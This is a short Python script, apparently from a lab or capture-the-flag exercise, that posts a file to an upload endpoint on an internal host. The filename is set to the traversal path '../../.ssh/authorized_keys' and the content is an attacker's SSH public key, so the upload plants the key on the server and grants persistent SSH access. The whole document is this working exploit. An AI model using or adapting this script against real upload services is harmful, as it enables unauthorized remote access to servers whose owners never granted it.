import requests

url = "https://dropbox.internal.regjeringen.uiaikt.no"

rsa_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC01zqpo8OMWTf3l5vQW91+8QevH4enL0RVxf3yw/nBqD4mR1D4ecfARlwQOlA28b1Vh8sYE5+WD4GniTNpkJDP858pYLNwMFpph0K8i/jP7buZULjMYuciK0hm9MHfaMGEtyjXWJEbfz2BwEj34Idi6UXMW8DhyNe78+gZq+0Vnq9J9LMO7ChYCzbAingFx5gBgwVoNJUhoVCNiZkcZFPQBLOiM3ltgj+t884Qn/0RGo4QYERU4z6l04I89DEI0hXOQBtrJr+XcSbRHEmw0R3ZSJOoSTXQDdkBtjwRlMyWDvyLN51hEK9sbN7odtHNEGvuHXY+nDrCWh5ex81nsAjD02E7d/nz8E/zJsHd2iMGdr3cElVHz0Hwf2MkIAPzHogaLHZCrtr/9zTK3yhmoSqTUUjFbMACJKCLfsl5WIhGG1wHjYiwFm8FzuzY046yrUUi7kGcfnWjcn2h05kIwtC+usECus5Smm/B8KlSpO0F3Wie2f4bksZ6G7UcMKqH/GWYgQKmkP26GTK8PfkvRVOWombLvCMx6YfYpYEtOs4GgK5OIKLjSvoZQ1gD7j83+G6UnvlG7JYJVZCjMV8xaopNxFmse4w0Ny2To5Pcro6jeHgF99QeXwDo15G+WigaJvgNaIqcRivV6Dh7aLKrO/BxKjHWQ82Axyx4bGzlJcN2Tw== Thomas@LAPTOP-NJ16440S"

# File Data
files = {
    'file': ('../../.ssh/authorized_keys', rsa_key, 'application/octet-stream'),
}

# Send the request
response = requests.post(url, files=files)

print(response.status_code)
print(response.text)